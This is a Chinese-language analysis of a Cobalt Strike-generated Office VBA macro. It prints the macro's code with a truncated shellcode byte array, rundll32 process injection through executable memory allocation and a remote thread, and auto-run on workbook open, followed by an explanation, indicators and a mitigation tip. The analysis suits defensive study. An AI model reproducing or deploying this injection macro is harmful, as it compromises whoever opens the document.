#If VBA7 Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
    Dim rwxpage As Long, res As Long
#End If

条件编译指令，判断 VBA 的版本（64 位或 32 位）定义变量类型。LongPtr：是用于处理指针或句柄的类型，为 64 位或 32 位数据兼容性提供支持

    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _
13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _
-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _
-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-43,-24,0,0,0,0,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-92,0,0,0,91,49,-55,81,81,106,3,81,81,104,-69,1,0,0,83, _
80,104,87,-119,-97,-58,-1,-43,80,-23,-116,0,0,0,91,49,-46,82,104,0,50,-64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61, _
.......
)

 定义字节数组，创建一个包含多个整数的数组，这些整数通常代表某段二进制代码。内容是ShellCode可执行内容

    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If

获取 rundll32.exe路径，判断系统的位数（32 位或 64 位），获取并设置相应的 rundll32.exe路径。使用 rundll32.exe，表示接下来要加载或执行恶意代码

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

执行RunStuff，调用 RunStuff 函数，执行之前获得的 sProc，为了启动 rundll32.exe 进程，并准备接下来的操作

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)

内存分配，通过 AllocStuff 在目标进程中分配一块可读、可写、可执行的内存。&H1000和 &H40 表示内存的分配属性

    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset

写入字节到目标进程内存，将字节数组的内容逐一写入到先前分配的内存区域。每个字节都是通过 WriteStuff 写入，通常用于注入 shellcode

    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)

创建线程执行代码，在目标进程中创建一个新的线程，指向前面写入的内存地址 rwxpage，执行动态注入的代码。

End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

自动打开子程序，确保该宏会在工作簿打开时自动运行，达到自启动的目的


cs生成的宏payload代码解释
1.条件编译指令，判断 VBA 的版本（64 位或 32 位）定义变量类型。LongPtr：是用于处理指针或句柄的类型，为 64 位或 32 位数据兼容性提供支持
2.定义字节数组，创建一个包含多个整数的数组，这些整数通常代表某段二进制代码。内容是ShellCode可执行内容
3.获取 rundll32.exe路径，判断系统的位数（32 位或 64 位），获取并设置相应的 rundll32.exe路径。使用 rundll32.exe，表示接下来要加载或执行恶意代码
4.执行RunStuff，调用 RunStuff 函数，执行之前获得的 sProc，为了启动 rundll32.exe 进程，并准备接下来的操作
5.内存分配，通过 AllocStuff 在目标进程中分配一块可读、可写、可执行的内存。&H1000和 &H40 表示内存的分配属性
6.写入字节到目标进程内存，将字节数组的内容逐一写入到先前分配的内存区域。每个字节都是通过 WriteStuff 写入，通常用于注入 shellcode
7.创建线程执行代码，在目标进程中创建一个新的线程，指向前面写入的内存地址 rwxpage，执行动态注入的代码。
8.自动打开子程序，确保该宏会在工作簿打开时自动运行，达到自启动的目的


流程总结
	1.环境准备：定义变量和根据系统环境选择合适的路径。
	2.代码准备：构建字节数组，准备执行的二进制内容。
	3.进程与内存操作：
		使用 rundll32.exe启动新进程。
		分配可执行内存区域以存放代码。
		将字节写入目标进程的内存中。
		创建新线程来执行写入的代码。
	4.自动启动：确保宏在打开工作簿时自动执行，增加隐蔽性和易用性。


敏感函数
	RunStuff：用于执行外部程序。
	AllocStuff：在目标进程中分配内存。
	WriteStuff：向目标进程的内存地址写入数据。
	CreateStuff：在目标进程中创建新线程。


敏感信息
	1.使用 rundll32.exe启动进程。
	2.动态内存分配和代码写入的过程，会判断是用于恶意代码的执行。


替代方案建议
	1.不动态执行二进制数据：在代码中不直接写入、执行动态生成或从外部来源加载的可执行代码。
